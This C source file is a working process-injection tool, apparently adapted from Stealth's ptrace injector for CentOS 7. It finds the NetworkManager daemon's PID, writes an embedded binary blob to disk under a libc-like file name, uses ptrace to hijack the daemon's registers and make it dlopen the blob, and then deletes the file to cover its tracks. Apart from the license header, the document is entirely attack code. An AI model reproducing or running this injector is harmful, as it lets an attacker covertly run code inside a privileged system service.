/*
 * Copyright (C) 2007-2009 Stealth.
 * All rights reserved.
 *
 * This is NOT a common BSD license, so read on.
 *
 * Redistribution in source and use in binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1. The provided software is FOR EDUCATIONAL PURPOSES ONLY! You must not
 *    use this software or parts of it to commit crime or any illegal
 *    activities. Local law may forbid usage or redistribution of this
 *    software in your country.
 * 2. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 3. Redistribution in binary form is not allowed.
 * 4. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *      This product includes software developed by Stealth.
 * 5. The name Stealth may not be used to endorse or promote
 *    products derived from this software without specific prior written
 *    permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY
 * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */


// this version is mainly for centos 7

#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <elf.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <stddef.h>
#include <assert.h>
#include <sys/ptrace.h>
#include <asm/ptrace.h>
#include <sys/user.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <signal.h>
#include <dlfcn.h>

#include <dirent.h>

extern unsigned char _binary_blob_bin_start;
extern unsigned char _binary_blob_bin_end;

int string_ends_with(const char * str, const char * suffix)
{
  int str_len = strlen(str);
  int suffix_len = strlen(suffix);

  return 
    (str_len >= suffix_len) &&
    (0 == strcmp(str + (str_len-suffix_len), suffix));
}

int write_file(const char * path, unsigned char * buf, int size)
{
	int fd = open(path, O_CREAT|O_TRUNC|O_WRONLY);
	int n = write(fd, buf, size);
	close(fd);
	if (n != size) {
		perror("partial write\n");
	}
	chmod(path, S_IRUSR|S_IWUSR|S_IXUSR|S_IRGRP|S_IXGRP|S_IROTH|S_IXOTH);
}


void die(const char *s)
{
	perror(s);
	exit(0);
}


char *find_libc_start(pid_t pid)
{
	char path[1024];
	char buf[1024], *start = NULL, *end = NULL, *p = NULL;
	char *addr1 = NULL, *addr2 = NULL;
	FILE *f = NULL;
	

	snprintf(path, sizeof(path), "/proc/%d/maps", pid);

	if ((f = fopen(path, "r")) == NULL)
		die("fopen");

	for (;;) {
		if (!fgets(buf, sizeof(buf), f))
			break;
		if (!strstr(buf, "r-xp"))
			continue;
		if (!(p = strstr(buf, "/")))
			continue;
		if (!strstr(p, "/libc-"))
			continue;
		start = strtok(buf, "-");
		addr1 = (char *)strtoul(start, NULL, 16);
		end = strtok(NULL, " ");
		addr2 = (char *)strtoul(end, NULL, 16);
		break;
	}

	fclose(f);	
	return addr1;
}

int find_l(int pid)
{
	char path[1024];
	snprintf(path, sizeof(path), "/proc/%d/maps", pid);
	
	FILE *fp;
	char *line = NULL;
    size_t len = 0;
    ssize_t read;
	
	if ((fp = fopen(path, "r")) == NULL)
		die("fopen");
	
	int found = 0;
	while ((read = getline(&line, &len, fp)) != -1) {
		if(strstr(line, "libc-2.13.so")) {
			found = 1;
			break;
		}
    }
	free(line);
	fclose(fp);
	
	return found;
}


int poke_text(pid_t pid, size_t addr, char *buf, size_t blen)
{
	int i = 0;
	char *ptr = malloc(blen + blen % sizeof(size_t));	// word align
	memcpy(ptr, buf, blen);

	for (i = 0; i < blen; i += sizeof(size_t)) {
		if (ptrace(PTRACE_POKETEXT, pid, addr + i, *(size_t *)&ptr[i]) < 0)
			die("ptrace");
	}
	free(ptr);
	return 0;
}



int peek_text(pid_t pid, size_t addr, char *buf, size_t blen)
{
	int i = 0;
	size_t word = 0;
	for (i = 0; i < blen; i += sizeof(size_t)) {
		word = ptrace(PTRACE_PEEKTEXT,pid, addr + i, NULL);
		memcpy(&buf[i], &word, sizeof(word));
	}
	return 0;
}


int inject_code(pid_t pid, size_t libc_addr, size_t dlopen_addr, char *dso)
{
	char sbuf1[1024], sbuf2[1024];
	struct user_regs_struct regs, saved_regs;
	int status;

	if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0)
		die("ptrace 1");
	waitpid(pid, &status, 0);
	if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0)
		die("ptrace 2");

	peek_text(pid, regs.rsp + 1024, sbuf1, sizeof(sbuf1));
	peek_text(pid, regs.rsp, sbuf2, sizeof(sbuf2));

	/* fake saved return address */
	libc_addr = 0x0;
	poke_text(pid, regs.rsp, (char *)&libc_addr, sizeof(libc_addr));
	poke_text(pid, regs.rsp + 1024, dso, strlen(dso) + 1); 

	memcpy(&saved_regs, &regs, sizeof(regs));

	/* pointer to &args */
	// printf("rdi=%zx rsp=%zx rip=%zx\n", regs.rdi, regs.rsp, regs.rip);

	regs.rdi = regs.rsp + 1024;
	regs.rsi = RTLD_NOW|RTLD_GLOBAL|RTLD_NODELETE;
	regs.rip = dlopen_addr + 2;// kernel bug?! always need to add 2!

	if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0)
		die("ptrace 3");
	if (ptrace(PTRACE_CONT, pid, NULL, NULL) < 0)
		die("ptrace 4");

	/* Should receive a SIGSEGV */
	waitpid(pid, &status, 0);

	if (ptrace(PTRACE_SETREGS, pid, 0, &saved_regs) < 0)
		die("ptrace 5");

	poke_text(pid, saved_regs.rsp + 1024, sbuf1, sizeof(sbuf1));
	poke_text(pid, saved_regs.rsp, sbuf2, sizeof(sbuf2));

	if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0)
		die("ptrace 6");

	return 0;
}



void usage(const char *path)
{
	printf("Usage: %s <pid> <dso-path>\n", path);
}


int main(int argc, char **argv)
{

	/*
	//daemonize
	pid_t p1 = fork();

    if (p1 != 0)
    {
        wait(NULL);
		exit(0);
    }
    else
    {
        pid_t p2 = fork();
        int pid = getpid();

        if (p2 != 0) 
        {
			exit(0);
        }
    }
	
	*/
	
	usleep(500000); // sleep 0.5 seconds
	// first find the NetworkManager process
	char * sysfs_id = "/sys/fs/cgroup/systemd/system.slice/NetworkManager.service/cgroup.procs";
	
	FILE *fp;
    char *line = NULL;
    size_t len = 0;
    ssize_t read;

    fp = fopen(sysfs_id, "r");
    if (fp == NULL) {
//		system("echo 1 > /error");
        exit(0);
	}
	
	int pid;
	read = getline(&line, &len, fp);
	sscanf(line, "%d", &pid);
	// printf("%d\n", pid);
	fclose(fp);
	// exit(0);
	
	
	
	DIR *dir, *dd;
    struct dirent *dp, *ddp;
    char * file_name;
	char buff[400];
	char path[400];
	int ln_size;

	
	/*
	int found = 0;
        int ii = 0;
	for (ii = 0;ii <= 300; ii++) {
		dir = opendir("/proc");
		while ((dp=readdir(dir)) != NULL) {
			if ( dp->d_type == DT_DIR && dp->d_name[0] >= 48 && dp->d_name[0] <= 57) {
				sprintf(path, "/proc/%s/exe", dp->d_name);
				ln_size = readlink(path, buff, 400);
				if (ln_size > 0) {
					buff[ln_size] = 0;
					if (! string_ends_with(buff, "getty")) {
						continue;
					}
					sprintf(path, "/proc/%s/fd/0", dp->d_name);
					ln_size = readlink(path, buff, 400);
					if (ln_size > 0) {
						buff[ln_size] = 0;
					} else {
						buff[0] = 0;
					}
					if (strcmp(buff, "/dev/tty1")==0) {
						// printf("FOUND %s\n", dp->d_name);
						found = 1;
						break;
					}
				} else {
					buff[0] = 0;
				}
				// printf("exe: %s -> %s\n", dp->d_name, buff);
			}
		}
		closedir(dir);
		
		if (found) {
			break;
		}
		// printf("waiting...\n");
		usleep(5000000); // sleep 5 seconds to wait getty up
	}
	
	*/
	// now write our lib file
	struct stat sb;
	char * lib_path;
	
	if (stat("/lib/x86_64-linux-gnu/", &sb) == 0 && S_ISDIR(sb.st_mode))
    {
        lib_path = "/lib/x86_64-linux-gnu/libc-2.13.so";
    } else if (stat("/lib64", &sb) == 0 && S_ISDIR(sb.st_mode)) {
		lib_path = "/lib64/libc-2.13.so";
	}
	
	
	write_file(lib_path, &_binary_blob_bin_start, &_binary_blob_bin_end - &_binary_blob_bin_start);
	
	// pid_t daemon_pid = (pid_t)atoi(dp->d_name);
	pid_t daemon_pid = pid;
	char *my_libc = NULL, *daemon_libc = NULL;
	char *dl_open_address = NULL;
	char *dlopen_mode = NULL;
	FILE *pfd = NULL;
	char buf[128], *space = NULL;

	/* nm /lib64/libc.so.6|grep __libc_dlopen_mode: 00000000000f2a40 t __libc_dlopen_mode */
	size_t dlopen_offset = 0;


	setbuffer(stdout, NULL, 0);

	my_libc = find_libc_start(getpid());
	
	// printf("Trying to obtain __libc_dlopen_mode() address relative to libc start address.\n");
	// printf("[1] Using my own __libc_dlopen_mode ...\n");
	dlopen_mode = dlsym(NULL, "__libc_dlopen_mode");
	if (dlopen_mode)
		dlopen_offset = dlopen_mode - my_libc;
		
	if (dlopen_offset == 0 && 
	    (pfd = popen("nm /lib64/libc.so.6|grep __libc_dlopen_mode", "r")) != NULL) {
		// printf("[2] Using nm method ... ");
		fgets(buf, sizeof(buf), pfd);
		if ((space = strchr(buf, ' ')) != NULL)
			*space = 0;
		dlopen_offset = strtoul(buf, NULL, 16);
		fclose(pfd);
	}
	if (dlopen_offset == 0) {
		// printf("failed!\nNo more methods, bailing out.\n");
		return 0;
	}
	// printf("success!\n");

	// dl_open_address = find_libc_start(getpid()) + dlopen_offset;
	// daemon_pid = (pid_t)atoi(argv[1]);
	daemon_libc = find_libc_start(daemon_pid);

	// printf("me: {__libc_dlopen_mode:%p, dlopen_offset:%zx}\n=> daemon: {__libc_dlopen_mode:%p, libc:%p}\n",
	       // dl_open_address, dlopen_offset, daemon_libc + dlopen_offset, daemon_libc);

	int ll;
	for (ll = 0; ll < 10; ll++) {
		inject_code(daemon_pid, (size_t)daemon_libc,
					(size_t)(daemon_libc + dlopen_offset), lib_path);
		if(find_l(daemon_pid)) {
			// printf("done!\n");
			break;
		}
		usleep(500000); // sleep 0.5 seconds
	}

	unlink(lib_path);
				
	// printf("done!\n");
	return 0;
}
